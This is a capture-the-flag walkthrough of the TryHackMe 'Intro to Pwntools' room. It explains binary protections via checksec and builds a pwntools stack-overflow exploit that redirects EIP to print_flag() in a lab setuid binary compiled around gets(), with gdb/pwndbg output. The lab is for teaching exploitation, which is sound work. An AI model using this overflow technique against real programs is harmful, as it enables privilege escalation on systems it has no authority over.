# Intro To Pwntools

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
Tags: Windows, Linux
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
An introductory room for the binary exploit toolkit Pwntools.
```

Room link: [https://tryhackme.com/room/introtopwntools](https://tryhackme.com/room/introtopwntools)

## Solution

### Task 1: Introduction

Hello there, and welcome to Intro to Pwntools!

My name is DiZma$ and I will be your guide through this journey of software exploitation. When I started learning binary exploitation and CTFs, I learned that many CTF players use **Pwntools**, but when I searched for a basic guide on how to get started, I found little on the topic. Because of this, I set out to create my own tutorial. According to the Pwntools github, "*Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible*" ([Pwntools Github page](https://github.com/Gallopsled/pwntools)).

Prior experience in binary exploitation is not required for this room, although it may help. I will provide brief explanations, although if you would like more in-depth material, I will try to direct you to some helpful sources.

#### Tools and Installation

The tools and challenges for today are on the provided VM, although if you would like, you can set them up on your own machine:

Pwntools can be installed through pip. You can follow the installation guide here: [https://docs.pwntools.com/en/stable/install.html](https://docs.pwntools.com/en/stable/install.html). Please note, I have set up Pwntools with python2 on the VM for today, because I prefer exploit development in python2.

The other tool we will be using is **pwndbg**, which is "*a GDB plug-in that makes debugging with GDB suck less, with a focus on features needed by low-level software developers, hardware hackers, reverse-engineers and exploit developers*" ([pwndbg Github page](https://github.com/pwndbg/pwndbg)). If you have ever used gdb for binary exploitation, you know it can be cumbersome. Pwndbg prints out useful information, such as registers and assembly code, with each breakpoint or error, making debugging and dynamic analysis easier. To install it, you can refer to the Github page. All you need to do is download it from Github and run the setup script, and it will automatically attach to gdb.

Lastly, if you would like to download the challenges from this room to use on your own machine, you can find them (and my solutions) on my Github: [https://github.com/dizmascyberlabs/IntroToPwntools](https://github.com/dizmascyberlabs/IntroToPwntools).

#### Starting up the machine and Logging in

Please start up the attached VM. Once it is started, you can ssh into it with the following credentials:

- **user**: `buzz`
- **pass**: `buzz`

`ssh buzz@10.67.190.30`

`buzz@10.67.190.30's password: buzz`

Please note that after typing in the password, you may have to wait a few seconds before you are logged in.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Intro_to_Pwntools]
└─$ ssh buzz@10.67.190.30
The authenticity of host '10.67.190.30 (10.67.190.30)' can't be established.
ED25519 key fingerprint is SHA256:/nh34w2o2BpiaMWioyRW54PiyMtAUHck7zxX/nKTuQ0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.67.190.30' (ED25519) to the list of known hosts.
buzz@10.67.190.30's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 03 Feb 2026 04:36:59 PM UTC

  System load:  0.08              Processes:             110
  Usage of /:   81.6% of 8.76GB   Users logged in:       0
  Memory usage: 16%               IPv4 address for ens5: 10.67.190.30
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Infrastructure is not enabled.

29 updates can be applied immediately.
20 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Mon Jun 30 21:45:08 2025 from 10.23.8.228
buzz@ip-10-67-190-30:~$ 
```

Let's get pwning!

---------------------------------------------------------------------------------------

### Task 2: Checksec

In your home directory, you should see two directories, IntroToPwntools and pwndbg.  Our challenges are in IntroToPwntools. If you enter that directory, you will see a note, and another directory of the same name.  When you are ready, enter the second IntroToPwntools directory to begin your adventure!

```bash
buzz@ip-10-67-190-30:~$ ls
IntroToPwntools  pwndbg
buzz@ip-10-67-190-30:~$ cd IntroToPwntools/
buzz@ip-10-67-190-30:~/IntroToPwntools$ ls -la
total 20
drwxrwxr-x 4 buzz buzz 4096 Jun  9  2021 .
drwxr-xr-x 7 buzz buzz 4096 Jun 30  2025 ..
drwxrwxr-x 8 buzz buzz 4096 May 19  2021 .git
drwxrwxr-x 6 buzz buzz 4096 May 19  2021 IntroToPwntools
-rw-r--r-- 1 root root  140 Jun  9  2021 note.txt
buzz@ip-10-67-190-30:~/IntroToPwntools$ cat note.txt 


Dear buzz,
Welcome to Intro to Pwntools!
In this folder, you will find
a wonderful adventure of 
binary exploitation!

Sincerely,
dizmas

buzz@ip-10-67-190-30:~/IntroToPwntools$ cd IntroToPwntools/
buzz@ip-10-67-190-30:~/IntroToPwntools/IntroToPwntools$ ls
checksec  cyclic  networking  shellcraft
buzz@ip-10-67-190-30:~/IntroToPwntools/IntroToPwntools$ ls -la
total 24
drwxrwxr-x 6 buzz buzz 4096 May 19  2021 .
drwxrwxr-x 4 buzz buzz 4096 Jun  9  2021 ..
drwxrwxr-x 2 buzz buzz 4096 May 19  2021 checksec
drwxrwxr-x 2 buzz buzz 4096 Jun 30  2025 cyclic
drwxrwxr-x 2 buzz buzz 4096 Jun 10  2021 networking
drwxrwxr-x 2 buzz buzz 4096 Jun 10  2021 shellcraft
buzz@ip-10-67-190-30:~/IntroToPwntools/IntroToPwntools$ 
```

#### Checksec tool

You will find the four directories enclosed: checksec, cyclic, networking, and shellcraft. We will start with checksec.

Inside the checksec directory, we will find some c code and executables, both compiled from the c code. If you run either one, they seem to be the same program: it prompts for the user's name, and replies "Hello name!" These binaries may appear to be the same program, but one was compiled with protections to mitigate binary exploitation, while the other was compiled without these protections.

Run the following command and observe the result (as a warning, this command can be a little slow):

`checksec intro2pwn1`

Now run the same command with `intro2pwn2`.

```bash
buzz@ip-10-67-190-30:~/IntroToPwntools/IntroToPwntools$ cd checksec/
buzz@ip-10-67-190-30:~/IntroToPwntools/IntroToPwntools/checksec$ ls -l
total 20
-rwxrwxr-x 1 buzz buzz 7304 May 19  2021 intro2pwn1
-rwxrwxr-x 1 buzz buzz 7184 May 19  2021 intro2pwn2
-rw-rw-r-- 1 buzz buzz  141 May 19  2021 test_checksec.c
buzz@ip-10-67-190-30:~/IntroToPwntools/IntroToPwntools/checksec$ pwn checksec intro2pwn1
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
buzz@ip-10-67-190-30:~/IntroToPwntools/IntroToPwntools/checksec$ pwn checksec intro2pwn2
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
buzz@ip-10-67-190-30:~/IntroToPwntools/IntroToPwntools/checksec$ 
```

As you can see, these binaries both have the same architecture (i386-32-little), but differ in qualities such as RELRO, Stack canaries , NX, PIE, and RWX. Now, what are these qualities? Allow me to explain. Please note, this room does not require a deep knowledge of these beyond the basics.

**RELRO** stands for Relocation Read-Only, which makes the global offset table (GOT) read-only after the linker resolves functions to it. The GOT is important for techniques such as the ret-to-libc attack, although this is outside the scope of this room. If you are interested, you can refer to this blog post: [https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro).

**Stack canaries** are tokens placed after a stack to detect a stack overflow. These were supposedly named after birds that coal miners brought down to mines to detect noxious fumes. Canaries were sensitive to the fumes, and so if they died, then the miners knew they needed to evacuate. On a less morbid note, stack canaries sit beside the stack in memory (where the program variables are stored), and if there is a stack overflow, then the canary will be corrupted. This allows the program to detect a buffer overflow and shut down. You can read more about stack canaries here: [https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/).

**NX** is short for non-executable. If this is enabled, then memory segments can be either writable or executable, but not both. This stops potential attackers from injecting their own malicious code (called shellcode) into the program, because something in a writable segment cannot be executed.  On the vulnerable binary, you may have noticed the extra line **RWX** that indicates that there are segments which can be read, written, and executed. See this Wikipedia article for more details: [https://en.wikipedia.org/wiki/Executable_space_protection](https://en.wikipedia.org/wiki/Executable_space_protection)

**PIE** stands for Position Independent Executable. This loads the program dependencies into random locations, so attacks that rely on memory layout are more difficult to conduct. Here is a good blog about this: [https://access.redhat.com/blogs/766093/posts/1975793](https://access.redhat.com/blogs/766093/posts/1975793)

If you want a good overview of each of the checksec tested qualities, I have found this guide to be useful: [https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/](https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/)

---------------------------------------------------------------------------------------

#### Does Intro2pwn1 have FULL RELRO (Y or N)?

```bash
buzz@ip-10-67-190-30:~/IntroToPwntools/IntroToPwntools/checksec$ pwn checksec intro2pwn1
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

Answer: `Y`

#### Does Intro2pwn1 have RWX segments (Y or N)?

See output above.

Answer: `N`

#### Does Intro2pwn2 have a stack canary (Y or N)?

```bash
buzz@ip-10-67-190-30:~/IntroToPwntools/IntroToPwntools/checksec$ pwn checksec intro2pwn2
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

Answer: `N`

#### Does Intro2pwn2 not have PIE (Y or N)?

See output above.

Answer: `Y`

#### Cause a buffer overflow on intro2pwn1 by inputting a long string such as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. What was detected?

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/checksec$ ./intro2pwn1 
Please input your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
*** stack smashing detected ***: terminated
Aborted (core dumped)
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/checksec$ 
```

Answer: `Stack Smashing`

#### Now cause a buffer overflow on intro2pwn2. What error do you get?

Hint: This is often shortened to seg-fault. These are good news for the hacker. It means that you have directed the instruction pointer to an invalid place in memory. More on that later...

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/checksec$ ./intro2pwn2
Please input your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Segmentation fault (core dumped)
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/checksec$ 
```

Answer: `Segmentation Fault`

### Task 3: Cyclic

Good work! Now cd out of the checksec directory. Next on our itinerary is the cyclic directory. You should find 4 files there: a text of alphabet characters, a flag file, an executable, and the code for the executable. If we try to read the flag file, we are denied permission. If only we could get somebody else to open it...

#### Setting the stage

if you run the command:

`ls -l`

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/checksec$ cd ..
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools$ cd cyclic/
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ ls -l
total 20
-rw-rw-r-- 1 buzz   buzz    105 May 19  2021 alphabet
-r--r----- 1 dizmas dizmas   22 May 19  2021 flag.txt
-rwsrwxr-x 1 dizmas dizmas 7444 May 19  2021 intro2pwn3
-rw-rw-r-- 1 buzz   buzz    359 Jun 10  2021 test_cyclic.c
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ 
```

You will see that the flag file and intro2pwn3 are owned by the same user, and that the **suid** bit is set for intro2pwn3. This means that the program will keep its permissions when it executes. Please answer question 1.

If you view the c code, you may notice the `print_flag()` function, which will open the flag with the permissions we need. The issue is that the function does not run in the program, the program simply calls `start()` then ends. What if we could redirect the execution somehow? In fact, we can!

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ cat test_cyclic.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void print_flag() {
        printf("Getting Flag:\n");
        fflush(stdout);
        char *cat_flag[3] = {"/bin/cat", "flag.txt", NULL};
        execve("/bin/cat", cat_flag,  NULL);
        exit(0);
}

void start(){
        char name[24];
        gets(name);
}


int main(){
        printf("I run as dizmas.\n");
        printf("Who are you?: ");
        start();

}
```

This program is vulnerable to a buffer overflow, because it uses the `gets()` function, which does not check to see if the user input is actually in bounds (you can read about this [here](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351)). In our case, the name variable has 24 bytes allocated, so if we input more than 24 bytes, we can write to other parts of memory. Please answer question 2.

An important part of the memory we can overwrite is the instruction pointer (IP), which is called the **eip** on 32-bit machines, and rip on 64-bit machines. The IP points to the next instruction to be executed, so if we redirect the eip in our binary to the `print_flag()` function, we can print the flag.

#### Cyclic tool

To control the IP, the first thing we need do is to is overflow the stack with a pattern, so we can see where the IP is. I have provided the alphabet file as a pattern. Let's fire up gdb!

`gdb intro2pwn3`

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb -q intro2pwn3
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...
(No debugging symbols found in intro2pwn3)
pwndbg> 
```

To run a program in gdb, type `r`. You will see the program function normally. If you want to add an input from a text file, you use the "<" key, as such:

`r < alphabet`

```bash
pwndbg> r < alphabet
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < alphabet
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0x4a4a4a4a in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffb36b68 ◂— 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
 EBX  0x48484848 ('HHHH')
 ECX  0xf7f6e580 (_IO_2_1_stdin_) ◂— 0xfbad2088
 EDX  0xffb36bd0 —▸ 0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x2bf24
 EDI  0xf7f6e000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7f6e000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x49494949 ('IIII')
 ESP  0xffb36b90 ◂— 'KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
 EIP  0x4a4a4a4a ('JJJJ')
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x4a4a4a4a










──────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffb36b90 ◂— 'KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
01:0004│     0xffb36b94 ◂— 'LLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
02:0008│     0xffb36b98 ◂— 'MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
03:000c│     0xffb36b9c ◂— 'NNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
04:0010│     0xffb36ba0 ◂— 'OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
05:0014│     0xffb36ba4 ◂— 'PPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
06:0018│     0xffb36ba8 ◂— 'QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
07:001c│     0xffb36bac ◂— 'RRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x4a4a4a4a
   f 1 0x4b4b4b4b
   f 2 0x4c4c4c4c
   f 3 0x4d4d4d4d
   f 4 0x4e4e4e4e
   f 5 0x4f4f4f4f
   f 6 0x50505050
   f 7 0x51515151
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

We've caused a segmentation fault, and you may observe that there is an invalid address at `0x4a4a4a4a`. If you scroll up, you can see the values at each register. For eip, it has been overwritten with `0x4a4a4a4a`. Please answer question 3.

Great, now we see that we can control the eip! Before we move on, I would like to talk about patterns. The alphabet file was useful here, but it can be time consuming to type all of that into a file (or write a script for it) every time you want to test a buffer overflow, and if the buffer is large, the alphabet file might not be big enough. This is where the cyclic tool comes in. The cyclic tool can be used both from the command line and in python scripts. The command line format is "cyclic number", like:

`cyclic 100`

This will print out a pattern of 100 characters Please quit gdb by typing "quit" and answer question 4.

If you have used `pattern_create` from the Metasploit Framework, this is works in a similar way. We can create a pattern file like this:

`cyclic 100 > pattern`

and then run the pattern file as input in gdb like we did with the alphabet file. Once again, we have a seg-fault and the eip is filled with 'jaaa' (please answer question 5).

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ pwn cyclic 100 > pattern
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb -q intro2pwn3
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...
(No debugging symbols found in intro2pwn3)
pwndbg> r < pattern
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < pattern
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0x6161616a in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffb55e48 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EBX  0x61616168 ('haaa')
 ECX  0xf7f72580 (_IO_2_1_stdin_) ◂— 0xfbad2098
 EDX  0xffb55eac ◂— 0x0
 EDI  0xf7f72000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7f72000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x61616169 ('iaaa')
 ESP  0xffb55e70 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EIP  0x6161616a ('jaaa')
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x6161616a










──────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffb55e70 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0004│     0xffb55e74 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
02:0008│     0xffb55e78 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
03:000c│     0xffb55e7c ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
04:0010│     0xffb55e80 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
05:0014│     0xffb55e84 ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
06:0018│     0xffb55e88 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaa'
07:001c│     0xffb55e8c ◂— 'raaasaaataaauaaavaaawaaaxaaayaaa'
────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x6161616a
   f 1 0x6161616b
   f 2 0x6161616c
   f 3 0x6161616d
   f 4 0x6161616e
   f 5 0x6161616f
   f 6 0x61616170
   f 7 0x61616171
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

#### Pwning to the flag

We can now begin to develop our exploit. To use pwntools in a python file, create a python file (mine is `pwn_cyclic.py`) and import the pwntools module at the top of the file:

`from pwn import *`

We can then use the cyclic function within the python code:

`padding = cyclic(100)`

Our padding is the space we need to get to the eip, so 100 is not the number we need. We need our padding to stop right before 'jaaa' so that we can fill in the eip with our own input. Luckily, there is a function in pwntools called `cyclic_find()`, which will find this automatically. Please replace the 100 with `cyclic_find('jaaa')`:

`padding = cyclic(cyclic_find('jaaa'))`

What do we fill the **eip** with? For now, to make sure we have the padding correct, we should fill it with a dummy value, like `0xdeadbeef`. We cannot, of course, simply write `0xdeadbeef` as a string, because the computer would interpret it as ascii, and we need it as raw hex. Pwntools offers an easy way to do this, with the `p32()` function (and `p64()` for 64-bit programs). This is similar to the `struct.pack()` function, if you have ever used it. We can add this to our code:

`eip = p32(0xdeadbeef)`

Now our entire code should look like this:

```python
from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0xdeadbeef)

payload = padding + eip

print(payload)
```

Please run the file with python (not python3!) and output to a text file (my python file is called `pwn_cyclic.py` and my text file is called `attack`).

`python pwn_cyclic.py > attack`

Run this new text file as input to intro2pwn3 in gdb, and make sure that you get an invalid address at `0xdeadbeef`. Please answer question 6.

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ vi pwn_cyclic.py 
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ cat pwn_cyclic.py 
from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0xdeadbeef)

payload = padding + eip

sys.stdout.buffer.write(payload)

buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ python pwn_cyclic.py > attack
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb -q intro2pwn3
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...
(No debugging symbols found in intro2pwn3)
pwndbg> r < attack
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < attack
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffebda48 ◂— 0x61616161 ('aaaa')
 EBX  0x61616168 ('haaa')
 ECX  0xf7f73580 (_IO_2_1_stdin_) ◂— 0xfbad2098
 EDX  0xffebda70 —▸ 0xffebda00 ◂— 0x1
 EDI  0xf7f73000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7f73000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x61616169 ('iaaa')
 ESP  0xffebda70 —▸ 0xffebda00 ◂— 0x1
 EIP  0xdeadbeef
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0xdeadbeef










──────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ edx esp 0xffebda70 —▸ 0xffebda00 ◂— 0x1
01:0004│         0xffebda74 ◂— 0x0
02:0008│         0xffebda78 ◂— 0x0
03:000c│         0xffebda7c —▸ 0xf7da2ed5 (__libc_start_main+245) ◂— add    esp, 0x10
04:0010│         0xffebda80 —▸ 0xf7f73000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
05:0014│         0xffebda84 —▸ 0xf7f73000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
06:0018│         0xffebda88 ◂— 0x0
07:001c│         0xffebda8c —▸ 0xf7da2ed5 (__libc_start_main+245) ◂— add    esp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0xdeadbeef
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

The last thing we need to do is find the location of the `print_flag()` function. To find the print_flag() funtion, type this command into gdb:

`print& print_flag`

```bash
pwndbg> print &print_flag
$1 = (<text variable, no debug info> *) 0x8048536 <print_flag>
pwndbg> 
```

For me, the `print_flag()` function is at 0x8048536, please check to see if it is the same for you.

Replace the `0xdeadbeef` in your code with the location of the `print_flag` function. Once, again, we can run:

`python pwn_cyclic.py > attack`

Input the attack file into the intro2pwn3 binary in the command line (because gdb will not use the suid permissions), like this:

`./intro2pwn3 < attack`

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ cp pwn_cyclic.py pwn_cyclic2.py 
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ vi pwn_cyclic2.py 
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ cat pwn_cyclic2.py 
from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0x8048536)

payload = padding + eip

sys.stdout.buffer.write(payload)

buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ python pwn_cyclic2.py > attack2
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ ./intro2pwn3 < attack2 
I run as dizmas.
Who are you?: Getting Flag:
flag{<REDACTED>}
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ 
```

Yay, a flag! Please answer question 7.

---------------------------------------------------------------------------------------

#### Which user owns both the flag.txt and intro2pwn3 file?

Answer: `dizmas`

#### Use checksec on intro2pwn3. What bird-themed protection is missing?

Hint: What is the name of the token that detects an overflow?

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ pwn checksec intro2pwn3 
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ 
```

Answer: `canary`

#### What ascii letter sequence is 0x4a4a4a4a (pwndbg should tell you)

Hint: You can also use a hex to ascii converter.

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb -q intro2pwn3
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...
(No debugging symbols found in intro2pwn3)
pwndbg> r < alphabet
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < alphabet
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0x4a4a4a4a in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffb36b68 ◂— 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
 EBX  0x48484848 ('HHHH')
 ECX  0xf7f6e580 (_IO_2_1_stdin_) ◂— 0xfbad2088
 EDX  0xffb36bd0 —▸ 0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x2bf24
 EDI  0xf7f6e000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7f6e000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x49494949 ('IIII')
 ESP  0xffb36b90 ◂— 'KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
 EIP  0x4a4a4a4a ('JJJJ')
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x4a4a4a4a










